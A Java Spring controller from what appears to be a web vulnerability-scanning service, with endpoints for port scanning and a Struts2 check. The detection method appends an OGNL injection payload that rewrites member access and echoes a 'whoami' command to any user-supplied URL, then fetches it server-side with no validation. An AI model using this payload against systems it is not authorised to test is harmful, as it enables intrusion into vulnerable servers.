package com.cn.ctbri.controller;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.ResourceBundle;
import java.util.Set;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import net.sf.json.JSONArray;
import net.sf.json.JSONObject;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.params.HttpMethodParams;
import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import com.cn.ctbri.entity.Xlist;
import com.cn.ctbri.portscanEntity.AppReport;
import com.cn.ctbri.service.IAppReportService;
import com.cn.ctbri.service.IXlistService;
import com.cn.ctbri.util.JerseyJsonUtil;

@Controller
public class XController {
	// 日志对象
	private Logger log = Logger.getLogger(this.getClass());
	private static ResourceBundle bundle = ResourceBundle.getBundle("northAPI");
	private static String getScanServiceReportUrl = bundle
			.getString("createscantask_Url");
	@Autowired
	IXlistService xlistService;

	/**
	 * 跳转到x专区页面
	 */
	@RequestMapping("/Xpage.html")
	public String viewXPage(Model model, HttpServletRequest reques) {

		return "/source/page/Xpage/viewXPage";
	}

	/**
	 * 检测
	 */
	@RequestMapping("/detectionUrl.html")
	public void detectionUrl(HttpServletRequest request,
			HttpServletResponse response) {

		boolean flag = true;
		try {
			String urlInfo = request.getParameter("urlInfo");
			String uriPage = urlInfo
					+ "?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=whoami";
			flag = this.GetDetection(uriPage);
			if (!flag) {
				flag = this.PostDetection(uriPage);

			}
			response.setContentType("textml;charset=UTF-8");
			response.getWriter().print(flag);
		} catch (Exception e) {
			e.printStackTrace();

		}
	}

	public boolean PostDetection(String urlInfo) {

		boolean flag = false;
		try {
			log.info(urlInfo);

			HttpClient client = new HttpClient();
			PostMethod post = new PostMethod(urlInfo);
			// 用于乱码
			post.getParams().setParameter(
					HttpMethodParams.HTTP_CONTENT_CHARSET, "utf-8");
			// 提交执行
			int code = client.executeMethod(post);
			String body = null;
			// 判断返回值是否成功
			if (code == HttpStatus.SC_OK) {
				body = post.getResponseBodyAsString();
			}
			if (code == 200 && body != null) {
				if (body.indexOf("whoami") != -1) {
					flag = true;
					log.info("发现漏洞");

				} else {
					flag = false;
					log.info("无....");
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			log.info("访问地址无响应!");
			flag = false;
		}
		return flag;
	}

	public boolean GetDetection(String urlInfo) {
		boolean flag = false;
		try {
			HttpClient client = new HttpClient();
			GetMethod gets = new GetMethod(urlInfo);
			int code = client.executeMethod(gets);
			String body = null;
			if (code == HttpStatus.SC_OK) {
				body = gets.getResponseBodyAsString();
			}
			if (code == 200 && body != null) {
				if (body.indexOf("whoami") != -1) {
					flag = true;
					log.info("发现漏洞");

				} else {
					flag = false;
					log.info("无....");
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			log.info("访问地址无响应!");

			flag = false;
		}
		return flag;
	}

	/**
	 * 接收端口扫描的数据，但扫描数据等待时间较长，先直接返回在检测中效果。
	 * @param request
	 * @param response
	 */
	@RequestMapping("/portScanMethod.html")
	@ResponseBody
	public void portScanMethod(HttpServletRequest request,
			HttpServletResponse response) {
		String target = request.getParameter("target");
		String port = request.getParameter("port");
		
		SimpleDateFormat timeFormat = new SimpleDateFormat(
				"yyyy-MM-dd HH:mm:ss");
		long time = System.currentTimeMillis();
		
		String dataTime = timeFormat.format(time);
		JSONObject result = new JSONObject();
		JSONObject portLists = downResultParse(port, dataTime, target, "检测中");
		result.put("status", "success");
		result.put("portLists", portLists);
		System.out.println(result.toString());
		try {
			// CommonUtil.writeJsonToJsp(response, jsonArray);
			// CommonUtil.writeToJsp(response, jsonObject);
			response.getWriter().write(result.toString());
			response.getWriter().flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return;
	}

	/**
	 * 真正的post请求南向数据，大概需要两分钟
	 * @param request
	 * @param response
	 */
	@RequestMapping("/portScanPostMethod.html")
	@ResponseBody
	public void portScanPostMethod(HttpServletRequest request,
			HttpServletResponse response) {
		String target = request.getParameter("target");
		String port = request.getParameter("port");
		SimpleDateFormat timeFormat = new SimpleDateFormat(
				"yyyy-MM-dd HH:mm:ss");
		long time = System.currentTimeMillis();
		long time2=time+1000;
		String dataTime = timeFormat.format(time);
		String dataTime2= timeFormat.format(time2);
		JSONObject jsonObject2 = new JSONObject();
		jsonObject2.put("type", "CreateTask");
		jsonObject2.put("task_type", "portscan");
		jsonObject2.put("target", target);
		jsonObject2.put("port", port);
		jsonObject2.put("interval_time", 1);
		jsonObject2.put("start_time", dataTime);
		jsonObject2.put("end_time", dataTime2);
		JerseyJsonUtil jerseyJsonUtil = new JerseyJsonUtil();
		System.out.println("url2:"+getScanServiceReportUrl);
		System.out.println("json:"+jsonObject2.toString());
		String postResult=jerseyJsonUtil.postMethod(getScanServiceReportUrl,
				jsonObject2.toString());
		System.out.println("postResult:"+postResult);
		JSONObject createTaskResult = JSONObject.fromObject(postResult
				);
		String status=createTaskResult.getString("status");
		JSONObject result = new JSONObject();
		if(!"ok".equals(status)){
			result.put("status", "false");
			try {
				// CommonUtil.writeJsonToJsp(response, jsonArray);
				// CommonUtil.writeToJsp(response, jsonObject);
				response.getWriter().write(result.toString());
				response.getWriter().flush();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			return;
		}
		
		String id=createTaskResult.getString("taskid");
		//String id="40";
		//System.out.println("id:"+id);
		AppReport appReport=xlistService.getAppReportById(Integer.valueOf(id));
		int index=0;
		while(appReport==null&&index<4){
			appReport=xlistService.getAppReportById(Integer.valueOf(id));
			try {
				Thread.sleep(60000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			index++;
		}
		if(index==4){
			try {
				// CommonUtil.writeJsonToJsp(response, jsonArray);
				// CommonUtil.writeToJsp(response, jsonObject);
				response.getWriter().write(result.toString());
				response.getWriter().flush();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			return;
		}
		JSONObject portLists = new JSONObject();
		JSONArray rows = new JSONArray();
		int total = 0;
		//System.out.println(appReport.toString());
		if(appReport.getPortReport()==null){
			try {
				// CommonUtil.writeJsonToJsp(response, jsonArray);
				// CommonUtil.writeToJsp(response, jsonObject);
				response.getWriter().write(result.toString());
				response.getWriter().flush();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			return;
		}else{
			JSONArray json=JSONArray.fromObject(appReport.getPortReport());
			Iterator<Object>it=json.iterator();
			int i=0;
			while(it.hasNext()){
				JSONObject obj=(JSONObject) it.next();
				total++;
				JSONObject object = new JSONObject();
				object.put("id", i+1);
				object.put("port", obj.getString("port"));
				object.put("agreement", obj.getString("protocol"));
				object.put("state", obj.getString("state"));
				object.put("time", dataTime);
				rows.add(object);
				i++;
			}		
		}
			
		portLists.put("total", total);
		portLists.put("rows", rows);
		result.put("status", "success");
		result.put("portLists", portLists);
		System.out.println(result.toString());

		try {
			// CommonUtil.writeJsonToJsp(response, jsonArray);
			// CommonUtil.writeToJsp(response, jsonObject);
			response.getWriter().write(result.toString());
			response.getWriter().flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return;
	}

	/**
	 * 跳转到端口扫描页面
	 */
	@RequestMapping("/portScan.html")
	public String portScan(Model model, HttpServletRequest reques) {

		return "/source/page/Xpage/portScan";
	}

	/**
	 * 功能描述： 系统安全帮活动详情页面 参数描述： Model m
	 *
	 * @time 2017-8-24
	 */
	@RequestMapping("/Xlist.html")
	public String showXlist(Model m) {
		List<Xlist> servList = xlistService.listXlist();
		m.addAttribute("servList", servList);
		return "/source/page/child/Xlist";
	}
	
	@RequestMapping("/Xlisty.html")
	public String getAppR() {
		int id=1;
		AppReport appReport=xlistService.getAppReportById(id);
		System.out.println(appReport.toString());
		return null;
	}
	
	/**
	 * 直接不请求返回检测中，拼接json
	 * @param port
	 * @param sendTime
	 * @param target
	 * @param value
	 * @return
	 */
	public static JSONObject downResultParse(String port,String sendTime,String target,String value){
		JSONObject jsonObject = new JSONObject();
		List<Integer> list = new ArrayList<Integer>();
		String[] strArr = port.split(",");
		for (String str : strArr) {
			str = str.trim();
			if (str.contains("-")) {
				int number = str.indexOf('-');
				int begin = Integer.valueOf(str.substring(0, number).trim());
				int end = Integer.valueOf(str.substring(number + 1,
						str.length()).trim());
				if (begin > end) {
					int middle = end;
					end = begin;
					begin = middle;
				}
				for (int i = begin; i <= end; i++) {
					list.add(i);
				}
			} else {
				list.add(Integer.valueOf(str));
			}
		}
		int total = list.size();
		jsonObject.put("total", total);
		JSONArray jsonArray = new JSONArray();
		for (int i = 0; i < total; i++) {
			JSONObject jsonObject2 = new JSONObject();
			jsonObject2.put("id", i + 1);
			jsonObject2.put("port", list.get(i));
			jsonObject2.put("agreement", "unknown");
			jsonObject2.put("state", value);
			jsonObject2.put("time", sendTime);
			jsonArray.add(jsonObject2);
		}
		jsonObject.put("rows", jsonArray);
		return jsonObject;
	}
	
	
}
